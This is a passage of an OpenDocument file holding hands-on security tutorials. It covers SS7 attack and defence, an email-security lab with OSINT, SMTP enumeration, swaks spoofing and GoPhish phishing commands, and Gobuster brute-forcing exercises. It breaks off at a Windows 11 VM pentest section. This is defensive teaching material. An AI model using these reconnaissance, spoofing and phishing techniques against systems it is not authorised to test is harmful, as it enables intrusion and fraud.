      <text:p text:style-name="Text_20_body"><text:soft-page-break/>Research showed that using these features with the S-H-ESD algorithm could detect SS7 attacks with reasonable accuracy .</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📋 Part 7: Quick Reference - Attack vs Defense</text:h>
      <table:table table:name="Table7" table:style-name="Table7">
        <table:table-column table:style-name="Table7.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table7.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Attack Vector</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table7.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">How It Works</text:span></text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table7.C1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading"><text:span text:style-name="T12">Your Defense</text:span></text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Location Tracking</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">anyTimeInterrogation</text:span> SS7 message</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.C2" office:value-type="string">
            <text:p text:style-name="P62">Cannot be prevented individually; rely on carrier SS7 firewalls</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Call Interception</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">updateLocation</text:span> tricking carrier</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.C2" office:value-type="string">
            <text:p text:style-name="P62">Use encrypted calling apps</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">SMS Interception</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">sendRoutingInfoForSM</text:span> redirect</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Stop using SMS for 2FA</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">2FA Code Theft</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="P62">Intercept SMS OTP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Use authenticator apps</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Account Takeover</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="P62">USSD + SS7 spoofing</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.C2" office:value-type="string">
            <text:p text:style-name="P62">Monitor accounts, use MFA</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">Denial of Service</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.A2" office:value-type="string">
            <text:p text:style-name="P62">Malicious SS7 messages</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table7.C2" office:value-type="string">
            <text:p text:style-name="P62">Contact carrier immediately</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Part 8: Final Summary</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Key Takeaways</text:h>
      <text:list text:style-name="L24">
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T12">SS7 is fundamentally broken by design</text:span> - It was built on trust in an era with only a few reputable telecom operators .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T12">Attackers only need your phone number</text:span> - With SS7 access, that's sufficient to track, intercept, and redirect your communications .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T12">SMS-based 2FA is NOT secure</text:span> - SS7 attacks can intercept OTP codes. Switch to authenticator apps immediately .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T12">Encrypted apps bypass SS7</text:span> - Use Signal, WhatsApp, or FaceTime for sensitive communications .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T12">Carriers are the only ones who can fully protect you</text:span> - SS7 firewalls and proper filtering are the real solutions, but many carriers still have configuration gaps .</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T12">The problem will persist for decades</text:span> - Experts estimate 20+ years before SS7 is fully replaced. 5G's new signaling protocols are more secure, but adoption is slow .</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">Immediate Actions You Should Take Today</text:h>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="T12">Replace SMS 2FA with authenticator apps</text:span> (Google Authenticator, Authy, Microsoft Authenticator)</text:p>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="T12">Use encrypted messaging apps</text:span> for sensitive communications</text:p>
      <text:p text:style-name="Text_20_body"><text:soft-page-break/>✅ <text:span text:style-name="T12">Contact your carrier</text:span> and ask about their SS7 protection</text:p>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="T12">Monitor your accounts</text:span> for unauthorized access</text:p>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="T12">Use a secondary phone number</text:span> for banking if possible</text:p>
      <text:p text:style-name="Text_20_body">✅ <text:span text:style-name="T12">Keep your phone updated</text:span> with latest security patches</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📚 Additional Resources</text:h>
      <text:list text:style-name="L25">
        <text:list-item>
          <text:p text:style-name="P68"><text:span text:style-name="T12">GSMA FS.11 Guidelines</text:span> - SS7 Firewall specifications for operators</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P68"><text:span text:style-name="T12">ITU Technical Report</text:span> - SS7 vulnerabilities for digital financial services</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P68"><text:span text:style-name="T12">SRLabs Research</text:span> - Ongoing SS7 security research</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P68"><text:span text:style-name="T12">ENISA Signaling Security Studies</text:span> - European perspective on SS7 threats</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Remember:</text:span> This knowledge is for defense. Understanding how attackers exploit SS7 helps you make informed decisions about your personal security - primarily moving away from SMS-based authentication. The fundamental limitation is that individual users cannot directly protect against SS7 attacks; this must be done at the carrier level with proper firewalls and monitoring .</text:p>
      <text:p text:style-name="Text_20_body">The most powerful action you can take today is <text:span text:style-name="T12">eliminating SMS-based 2FA</text:span> from your important accounts. This single change protects you regardless of SS7 vulnerabilities .</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body">This guide provides a structured, hands-on pathway to understanding email security from both an offensive and defensive perspective, using your Kali Linux system and your own email as the test subject.</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🛑 Critical Legal and Ethical Warning</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">The techniques described here are for educational and defensive purposes only. You are ONLY permitted to test these methods against email addresses and systems you own or for which you have explicit, written permission.</text:span></text:p>
      <text:p text:style-name="Text_20_body">Unauthorized testing against any third-party email address or service is illegal and violates laws like the Computer Fraud and Abuse Act (CFAA). The goal of this lab is to understand the threats to better protect yourself.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">⚙️ Phase 1: Reconnaissance &amp; Information Gathering (OSINT)</text:h>
      <text:p text:style-name="Text_20_body">This phase simulates how an attacker gathers information about a target before launching an attack. The goal is to see what information about your email address is publicly available.</text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4"><text:soft-page-break/>Simple: Check for Breached Credentials</text:h>
      <text:list text:style-name="L26">
        <text:list-item>
          <text:p text:style-name="P69"><text:span text:style-name="T12">Install h8mail</text:span>: This tool checks if your email appears in known data breaches.</text:p>
          <text:p text:style-name="P70">sudo apt update<text:line-break/>sudo apt install h8mail -y</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P69"><text:span text:style-name="T12">Run a Basic Check</text:span>:</text:p>
          <text:p text:style-name="P70">h8mail -t "your-email@example.com"</text:p>
          <text:p text:style-name="P69"><text:span text:style-name="T12">What to Look For</text:span>: The results will show if your email address was found in any public data breaches. This is the first step in understanding your external risk exposure.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4" text:outline-level="4" text:is-list-header="true">Moderate: Gathering More Intelligence</text:h>
      <text:list text:style-name="L27">
        <text:list-item>
          <text:p text:style-name="P71"><text:span text:style-name="T12">Using </text:span><text:span text:style-name="T15">reconspider</text:span>: This tool can gather public information from multiple sources about your email.</text:p>
          <text:p text:style-name="P72">git clone https://github.com/bhavsec/reconspider.git<text:line-break/>cd reconspider<text:line-break/>python3 reconspider.py -e your-email@example.com</text:p>
          <text:p text:style-name="P71"><text:span text:style-name="T12">What to Look For</text:span>: The output will display social media profiles, Gravatar images, and other public data associated with the email. This shows how much of a public footprint you have.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P71"><text:span text:style-name="T12">Manually Check SMTP Configuration</text:span>: Use <text:span text:style-name="T13">mxcheck</text:span> to analyze the security posture of your email domain's mail servers.</text:p>
          <text:p text:style-name="P72">sudo apt install mxcheck -y<text:line-break/>mxcheck -s your-email-domain.com</text:p>
          <text:p text:style-name="P71"><text:span text:style-name="T12">What to Look For</text:span>: This tool checks for SPF, DKIM, and DMARC records. If any are missing, your domain is more vulnerable to spoofing and phishing.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔍 Phase 2: Vulnerability Assessment &amp; Exploitation (Testing Your Defenses)</text:h>
      <text:p text:style-name="Text_20_body">This phase simulates how an attacker would probe for weaknesses and attempt to compromise an account. <text:span text:style-name="T12">Again, only test against your own email.</text:span></text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">Simple: Test for User Enumeration</text:h>
      <text:p text:style-name="Text_20_body">Attackers often try to verify if an email address exists on a mail server before attacking it. This is called SMTP user enumeration.</text:p>
      <text:list text:style-name="L28">
        <text:list-item>
          <text:p text:style-name="P73"><text:span text:style-name="T12">Install </text:span><text:span text:style-name="T15">smtp-user-enum</text:span>:</text:p>
          <text:p text:style-name="P74">sudo apt install smtp-user-enum -y</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P73"><text:span text:style-name="T12">Test a Single User</text:span> (your email):</text:p>
          <text:p text:style-name="P74"><text:soft-page-break/>smtp-user-enum -M VRFY -u your-email@example.com -t mail.your-email-domain.com</text:p>
          <text:p text:style-name="P73"><text:span text:style-name="T12">What to Look For</text:span>: If the server responds with a "success" or "exists" message, it's revealing valid email addresses to unauthenticated users.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4" text:outline-level="4" text:is-list-header="true">Moderate: Test for Spoofing Vulnerabilities</text:h>
      <text:p text:style-name="Text_20_body">This simulates an attacker attempting to send a forged email from a trusted address (like "your-bank@bank.com") to your own address.</text:p>
      <text:list text:style-name="L29">
        <text:list-item>
          <text:p text:style-name="P75"><text:span text:style-name="T12">Install </text:span><text:span text:style-name="T15">swaks</text:span>: This is the "Swiss Army Knife" for SMTP testing.</text:p>
          <text:p text:style-name="P76">sudo apt install swaks -y</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P75"><text:span text:style-name="T12">Attempt a Basic Spoof</text:span> (replace <text:span text:style-name="T13">[YOUR_IP]</text:span> with your public IP if testing external, or use a local test server):</text:p>
          <text:p text:style-name="P76">swaks --to your-email@example.com --from "ceo@your-company.com" --body "This is a test spoofed email." --server smtp.your-email-domain.com</text:p>
          <text:p text:style-name="P75"><text:span text:style-name="T12">What to Look For</text:span>: Does this email end up in your inbox or spam folder? If it lands in your inbox, it indicates that your email provider's spam filters or your domain's SPF/DKIM/DMARC records are not configured strictly enough.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4" text:outline-level="4" text:is-list-header="true">Advanced: Run a Phishing Simulation with GoPhish</text:h>
      <text:p text:style-name="Text_20_body">This is a controlled way to test your own susceptibility to a phishing attack.</text:p>
      <text:list text:style-name="L30">
        <text:list-item>
          <text:p text:style-name="P77"><text:span text:style-name="T12">Install and Configure GoPhish</text:span>:</text:p>
          <text:p text:style-name="P78">wget https://github.com/gophish/gophish/releases/latest/download/gophish-vX.X.X-linux-64bit.zip<text:line-break/>unzip gophish-*.zip -d gophish<text:line-break/>cd gophish<text:line-break/>./gophish</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P77"><text:span text:style-name="T12">Setup</text:span>: Access the admin panel at <text:span text:style-name="T13">https://127.0.0.1:3333</text:span>. The default credentials are <text:span text:style-name="T13">admin:gophish</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P77"><text:span text:style-name="T12">Create a Campaign</text:span>: Configure a "Sending Profile" (you can use a test SMTP server like MailHog to avoid sending real emails), create a realistic email template, and send a test email to yourself.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P77"><text:span text:style-name="T12">Analyze the Results</text:span>: The GoPhish dashboard will show if you "clicked" the link, entered credentials, or opened the email. This is a powerful way to understand your own behavior and security awareness.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>🛡️ Phase 3: Defense &amp; Hardening</text:h>
      <text:p text:style-name="Text_20_body">Understanding the attack is only half the battle. The true goal is to build an impenetrable defense. After completing the tests above, you should have a clear idea of your weak points. Here's how to fix them.</text:p>
      <text:h text:style-name="Heading_20_4" text:outline-level="4">Simple: Strengthen Your Personal Defenses</text:h>
      <text:list text:style-name="L31">
        <text:list-item>
          <text:p text:style-name="P79"><text:span text:style-name="T12">Use a Password Manager</text:span>: This ensures you have a strong, unique password for your email, preventing credential-stuffing attacks.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79"><text:span text:style-name="T12">Enable Multi-Factor Authentication (MFA)</text:span>: This is your single most effective defense. Even if an attacker gets your password, they cannot log in without the second factor.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79"><text:span text:style-name="T12">Be Skeptical</text:span>: Always treat unsolicited emails with caution. Verify the sender's address, check for poor grammar, and never click on links or download attachments from unknown sources.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79"><text:span text:style-name="T12">Monitor Account Activity</text:span>: Regularly check your email account's "recent activity" or "logged-in devices" section to spot unauthorized access.</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4" text:outline-level="4" text:is-list-header="true">Moderate: Secure Your Domain (If You Own It)</text:h>
      <text:p text:style-name="Text_20_body">If you control the domain for your email, you can implement these powerful defenses to prevent spoofing.</text:p>
      <text:list text:style-name="L32">
        <text:list-item>
          <text:p text:style-name="P80"><text:span text:style-name="T12">Implement SPF (Sender Policy Framework)</text:span>: This tells receiving mail servers which IP addresses are authorized to send emails from your domain.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P80"><text:span text:style-name="T12">Implement DKIM (DomainKeys Identified Mail)</text:span>: This adds a digital signature to your emails, allowing recipients to verify they haven't been tampered with.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P80"><text:span text:style-name="T12">Implement DMARC (Domain-based Message Authentication, Reporting &amp; Conformance)</text:span>: This tells receiving servers what to do with emails that fail SPF or DKIM checks (e.g., quarantine or reject them).</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_4" text:outline-level="4" text:is-list-header="true">Advanced: Continuous Monitoring &amp; Auditing</text:h>
      <text:list text:style-name="L33">
        <text:list-item>
          <text:p text:style-name="P81"><text:span text:style-name="T12">Set Up Alerts</text:span>: Configure alerting rules in your email client or security information and event management (SIEM) system for suspicious login attempts or configuration changes.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P81"><text:span text:style-name="T12">Regularly Test Your Defenses</text:span>: Periodically re-run the tools from Phase 2 (especially <text:span text:style-name="T13">mxcheck</text:span> and <text:span text:style-name="T13">swaks</text:span>) to ensure your SPF, DKIM, and DMARC configurations are still valid and effective.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🔧 Tools &amp; Repositories Summary</text:h>
      <table:table table:name="Table8" table:style-name="Table8">
        <table:table-column table:style-name="Table8.A" table:number-columns-repeated="3"/>
        <table:table-header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Table8.A1" office:value-type="string">
              <text:p text:style-name="P82">Tool / Repository</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table8.A1" office:value-type="string">
              <text:p text:style-name="P82">Purpose</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Table8.C1" office:value-type="string">
              <text:p text:style-name="P82">How to Get It</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">h8mail</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">Breach data lookup for email addresses.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">sudo apt install h8mail</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <text:soft-page-break/>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">reconspider</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">OSINT framework to gather info on emails.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">git clone https://github.com/bhavsec/reconspider.git</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">mxcheck</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">Scans email server DNS and security records.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">sudo apt install mxcheck</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">smtp-user-enum</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">Enumerates valid users on an SMTP server.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">sudo apt install smtp-user-enum</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">swaks</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">Swiss Army Knife for SMTP testing.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">sudo apt install swaks</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">GoPhish</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">Phishing simulation and awareness platform.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">wget</text:span> from GitHub releases</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">EST (Email Spoofing Tool)</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">Professional framework for authorized email security assessments.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">git clone https://github.com/techsky-eh/EST.git</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T12">ismtp</text:span></text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.A2" office:value-type="string">
            <text:p text:style-name="P62">SMTP user enumeration, spoofing, and relay testing tool.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table8.C2" office:value-type="string">
            <text:p text:style-name="Table_20_Contents"><text:span text:style-name="T13">sudo apt install ismtp</text:span></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1">🛡️ Hands-On Penetration Testing Lab: Gobuster &amp; Windows 11</text:h>
      <text:p text:style-name="Text_20_body">This guide provides <text:span text:style-name="T12">practical exercises</text:span> for Gobuster and a <text:span text:style-name="T12">step-by-step beginner’s walkthrough</text:span> to hack your own Windows 11 virtual machine from your Kali Linux.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">⚠️ LEGAL WARNING:</text:span> Only perform these tests on systems you own or have explicit written permission to test. The lab described here uses a Windows 11 VM on your own machine – that's legal and safe.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📦 Part 1: Gobuster – Practical Exercises</text:h>
      <text:p text:style-name="Text_20_body">Gobuster is a versatile tool for brute‑forcing:</text:p>
      <text:list text:style-name="L34">
        <text:list-item>
          <text:p text:style-name="P83"><text:span text:style-name="T12">Directories &amp; Files</text:span> on web servers</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P83"><text:soft-page-break/><text:span text:style-name="T12">DNS subdomains</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P83"><text:span text:style-name="T12">Virtual Hosts</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P83"><text:span text:style-name="T12">S3 buckets</text:span> (with the <text:span text:style-name="T13">s3</text:span> mode)</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_3" text:outline-level="3" text:is-list-header="true">Exercise 1: Directory Busting on a Test Web Server</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Goal:</text:span> Discover hidden directories on a web server.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Setup (optional) – Start a simple HTTP server on Kali:</text:span></text:p>
      <text:p text:style-name="P44"># Create a dummy directory structure<text:line-break/>mkdir -p ~/webroot/secret/admin<text:line-break/>echo "Top Secret" &gt; ~/webroot/secret/admin/index.html<text:line-break/># Start Python HTTP server<text:line-break/>cd ~/webroot<text:line-break/>python3 -m http.server 8080 &amp;</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Run Gobuster against it:</text:span></text:p>
      <text:p text:style-name="P44">gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</text:p>
      <text:list text:style-name="L35">
        <text:list-item>
          <text:p text:style-name="P84"><text:span text:style-name="T13">-u</text:span> : target URL</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P84"><text:span text:style-name="T13">-w</text:span> : wordlist</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P84"><text:span text:style-name="T13">-x</text:span> : file extensions to append (helps find files like <text:span text:style-name="T13">secret.php</text:span>)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">What to observe:</text:span> Gobuster will find <text:span text:style-name="T13">/secret/</text:span> (and possibly <text:span text:style-name="T13">admin/</text:span>). This simulates an attacker discovering hidden admin panels.</text:p>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding:</text:span> It sends thousands of HTTP requests and records responses with status codes 200, 301, 403, etc. You can filter by status code with <text:span text:style-name="T13">-s</text:span>.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Exercise 2: DNS Subdomain Brute‑Forcing</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Goal:</text:span> Find subdomains of a target domain (use a domain you control, e.g., your own or a CTF target).</text:p>
      <text:p text:style-name="P44">gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</text:p>
      <text:list text:style-name="L36">
        <text:list-item>
          <text:p text:style-name="P85"><text:span text:style-name="T13">-d</text:span> : domain</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P85"><text:span text:style-name="T13">-w</text:span> : wordlist (install <text:span text:style-name="T13">seclists</text:span> if not present: <text:span text:style-name="T13">sudo apt install seclists</text:span>)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="T12">Understanding:</text:span> Gobuster performs DNS lookups for each subdomain in the wordlist. If a record exists, it reveals subdomains that may host different applications or services.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:soft-page-break/>Exercise 3: Virtual Host Enumeration</text:h>
      <text:p text:style-name="Text_20_body">Virtual hosts are multiple websites hosted on the same IP. This is used to find other sites on a shared server.</text:p>
      <text:p text:style-name="P44">gobuster vhost -u http://192.168.1.100 -w /usr/share/wordlists/vhosts.txt --domain example.com</text:p>
      <text:list text:style-name="L37">
        <text:list-item>
          <text:p text:style-name="P86"><text:span text:style-name="T13">-u</text:span> : base URL</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P86"><text:span text:style-name="T13">--domain</text:span> : the domain to test (or use IP)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P86">It sends <text:span text:style-name="T13">Host:</text:span> headers and checks for different responses.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Exercise 4: Fuzzing with Custom Extensions &amp; Status Codes</text:h>
      <text:p text:style-name="Text_20_body">You can fine‑tune Gobuster to find specific file types or ignore certain status codes:</text:p>
      <text:p text:style-name="P44">gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp -s 200,204,301,302,307 -b 404,403</text:p>
      <text:list text:style-name="L38">
        <text:list-item>
          <text:p text:style-name="P87"><text:span text:style-name="T13">-b</text:span> : status codes to blacklist (hide)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P87"><text:span text:style-name="T13">-s</text:span> : status codes to show (overrides blacklist)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🖥️ Part 2: Pentesting Your Windows 11 VM – Step‑by‑Step</text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">🧱 Lab Setup</text:h>
      <text:list text:style-name="L39">
        <text:list-item>
          <text:p text:style-name="P88"><text:span text:style-name="T12">VirtualBox Configuration</text:span></text:p>
          <text:list>
            <text:list-item>
